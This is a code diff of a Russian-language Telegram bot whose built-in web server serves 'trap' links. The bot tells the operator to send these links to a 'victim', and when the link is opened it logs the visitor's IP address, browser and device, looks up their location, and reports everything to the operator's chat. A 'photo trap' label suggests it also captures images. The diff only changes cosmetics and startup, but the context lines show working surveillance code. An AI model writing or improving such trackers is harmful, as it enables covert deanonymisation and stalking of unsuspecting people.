@@ -78,7 +78,7 @@ def _neptune_html():
   const rand=(a,b)=>a+Math.random()*(b-a);
   function resize(){W=innerWidth;H=innerHeight;canvas.width=W*dpr;canvas.height=H*dpr;canvas.style.width=W+'px';canvas.style.height=H+'px';ctx.setTransform(dpr,0,0,dpr,0,0);}
   function seed(){stars.length=0;motes.length=0;shards.length=0;for(let i=0;i<230;i++)stars.push({x:rand(0,1),y:rand(0,1),r:rand(.3,1.8),a:rand(.15,.85),p:rand(0,7),z:rand(.2,1)});for(let i=0;i<26;i++)motes.push({a:rand(0,Math.PI*2),r:rand(.15,1.25),v:rand(.1,.32),size:rand(1,3),tilt:rand(.4,1)});for(let i=0;i<11;i++)shards.push({x:rand(.08,.92),y:rand(.12,.9),s:rand(3,9),rot:rand(0,7),v:rand(.2,.65)});}
-  function background(){const g=ctx.createRadialGradient(W*.5,H*.47,0,W*.5,H*.47,Math.max(W,H)*.72);g.addColorStop(0,'#07162b');g.addColorStop(.27,'#020b18');g.addColorStop(.68,'#01050d');g.addColorStop(1,'#000207');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);for(const s of stars){const a=s.a*(.58+.42*Math.sin(t*1.5+s.p));ctx.globalAlpha=a;ctx.fillStyle=s.z>.72?'#dffcff':'#5dbde3';ctx.shadowBlur=s.z> .72?7:0;ctx.shadowColor='#63eaff';ctx.beginPath();ctx.arc(s.x*W+mx*12*s.z,s.y*H+my*8*s.z,s.r*s.z,0,Math.PI*2);ctx.fill();}ctx.globalAlpha=1;ctx.shadowBlur=0;}
+  function background(){const g=ctx.createRadialGradient(W*.5,H*.47,0,W*.5,H*.47,Math.max(W,H)*.72);g.addColorStop(0,'#07162b');g.addColorStop(.27,'#020b18');g.addColorStop(.68,'#01050d');g.addColorStop(1,'#000207');ctx.fillStyle=g;ctx.fillRect(0,0,W,H);for(const s of stars){const a=s.a*(.58+.42*Math.sin(t*1.5+s.p));ctx.globalAlpha=a;ctx.fillStyle=s.z>.72?'#dffcff':'#5dbbe3';ctx.shadowBlur=s.z> .72?7:0;ctx.shadowColor='#63eaff';ctx.beginPath();ctx.arc(s.x*W+mx*12*s.z,s.y*H+my*8*s.z,s.r*s.z,0,Math.PI*2);ctx.fill();}ctx.globalAlpha=1;ctx.shadowBlur=0;}
   function projectOrbit(a,r,tilt){const cx=W*.5+mx*18,cy=H*.5+my*15;return{x:cx+Math.cos(a)*r,y:cy+Math.sin(a)*r*tilt};}
   function orbit(a,r,tilt,color,width,alpha){ctx.save();ctx.translate(W*.5+mx*18,H*.5+my*15);ctx.rotate(a*.08);ctx.scale(1,tilt);ctx.beginPath();ctx.arc(0,0,r,0,Math.PI*2);ctx.strokeStyle=color;ctx.globalAlpha=alpha;ctx.lineWidth=width;ctx.shadowBlur=12;ctx.shadowColor=color;ctx.stroke();ctx.restore();}
   function planet(){const cx=W*.5+mx*18,cy=H*.5+my*15;const r=Math.min(W,H)*.105;orbit(t*.2, r*1.75,.43,'#1167ac',1,.62);orbit(-t*.16,r*2.25,.31,'#164e8c',1,.43);orbit(t*.12,r*2.8,.2,'#1b446d',1,.35);orbit(-t*.1,r*3.45,.42,'#1e557c',1,.32);for(let i=0;i<5;i++){const p=projectOrbit(t*(.2+i*.03)+i*1.7,r*(1.8+i*.32),.35+.04*i);ctx.save();ctx.translate(p.x,p.y);ctx.rotate(t*.8+i);ctx.fillStyle=i%2?'#63eaff':'#dffcff';ctx.shadowBlur=18;ctx.shadowColor='#63eaff';ctx.fillRect(-2,-2,4,4);ctx.restore();}
@@ -161,11 +161,11 @@ class TrapHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.end_headers()
 
-    def _send_info(self, token, chat_id, prefix="🪤 Открыл ловушку!"):
+    def _send_info(self, token, chat_id, prefix=" Открыл ловушку!"):
         ip = (self.headers.get("X-Forwarded-For", "")
               or self.client_address[0]).split(",")[0].strip()
         ua = self.headers.get("User-Agent", "unknown")
-        device = "📱 Мобильный" if any(x in ua for x in ["Android","iPhone","iPad","Mobile"]) else "💻 ПК"
+        device = "📱 Мобильный" if any(x in ua for x in ["Android","iPhone","iPad","Mobile"]) else " ПК"
         geo = "—"
         try:
             r = requests.get(
@@ -265,7 +265,7 @@ def start(message):
 def trap(message):
     token = secrets.token_urlsafe(12)
     traps[token] = message.chat.id
-    bot.reply_to(message, f"📸 Фото-ловушка готова!\n\n{BASE_URL}/view/{token}\n\nОтправь жертве 👆")
+    bot.reply_to(message, f" Фото-ловушка готова!\n\n{BASE_URL}/view/{token}\n\nОтправь жертве 👆")
 
 
 @bot.message_handler(commands=["vid"])
@@ -283,6 +283,13 @@ def run_http():
 
 
 if __name__ == "__main__":
+    # 🔥 ИСПРАВЛЕНИЕ: Удаляем webhook перед запуском polling
+    try:
+        bot.remove_webhook()
+        print("✅ Webhook удален, запускаем polling...")
+    except Exception as e:
+        print(f"⚠️ Ошибка при удалении webhook: {e}")
+    
     threading.Thread(target=run_http, daemon=True).start()
     print(f"Бот запущен | BASE_URL: {BASE_URL}")
     bot.infinity_polling()
